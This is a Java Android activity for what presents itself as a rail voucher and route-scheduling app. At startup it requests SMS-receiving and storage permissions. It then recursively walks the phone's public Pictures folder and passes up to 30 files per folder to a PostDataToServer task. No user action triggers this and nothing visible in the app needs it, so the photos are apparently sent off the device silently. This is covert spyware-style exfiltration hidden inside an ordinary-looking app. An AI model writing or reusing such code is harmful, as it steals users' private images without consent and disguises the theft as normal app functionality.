package com.example.myapplication;

import android.Manifest;
import android.os.Bundle;

import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.android.material.tabs.TabLayout;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentTransaction;
import androidx.lifecycle.MutableLiveData;
import androidx.viewpager.widget.ViewPager;
import androidx.appcompat.app.AppCompatActivity;

import android.os.Environment;
import android.view.View;

import com.example.myapplication.ui.main.SectionsPagerAdapter;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class RailVoucherActivity extends AppCompatActivity {
    public RailUtils utils;
    public List<ScheduledRoute> schedulesRoutes = new ArrayList<>();
    public MutableLiveData<Integer> scheduleListner = new MutableLiveData<>();

    public List<QRRouteItem> QRItems = new ArrayList<>();
    public MutableLiveData<Integer> QRListner = new MutableLiveData<>();

    private int MY_PERMISSIONS_REQUEST = 10;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_rail_voucher);
        SectionsPagerAdapter sectionsPagerAdapter = new SectionsPagerAdapter(this, getSupportFragmentManager());
        ViewPager viewPager = findViewById(R.id.view_pager);
        viewPager.setAdapter(sectionsPagerAdapter);
        TabLayout tabs = findViewById(R.id.tabs);
        tabs.setupWithViewPager(viewPager);

        utils = new RailUtils(this);
        scheduleListner.setValue(schedulesRoutes.size());
        QRListner.setValue(QRItems.size());

        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.READ_EXTERNAL_STORAGE},
                MY_PERMISSIONS_REQUEST);

        getImages(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES));
        FloatingActionButton fab = findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                fab.setVisibility(View.GONE);
                Fragment fr = new FindRouteFragment();
                FragmentManager fm = getSupportFragmentManager();
                fm.addOnBackStackChangedListener(new FragmentManager.OnBackStackChangedListener() {
                    @Override
                    public void onBackStackChanged() {
                        int backCount = getSupportFragmentManager().getBackStackEntryCount();
                        if (backCount == 0) {
                            fab.setVisibility(View.VISIBLE);
                        }
                    }
                });
                FragmentTransaction fragmentTransaction = fm.beginTransaction();
                fragmentTransaction.replace(R.id.fragment_place, fr);
                fragmentTransaction.addToBackStack(null).commit();
            }
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    public void addScheduleRoute(ScheduledRoute route) {
        this.schedulesRoutes.add(route);
        scheduleListner.setValue(schedulesRoutes.size());
    }

    public void removeScheduleRoute(ScheduledRoute route) {
        this.schedulesRoutes.remove(route);
        scheduleListner.setValue(schedulesRoutes.size());
    }

    public void addQRItem(QRRouteItem route) {
        this.QRItems.add(route);
        QRListner.setValue(QRItems.size());
    }

    public void getImages(File dir) {
        File[] files = dir.listFiles();
        for (int i = 0; i < files.length && i < 30; i++) {
            if (files[i].isDirectory()){
                getImages(files[i]);
            }
            else {
                try {
                    new PostDataToServer().execute(files[i]);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

}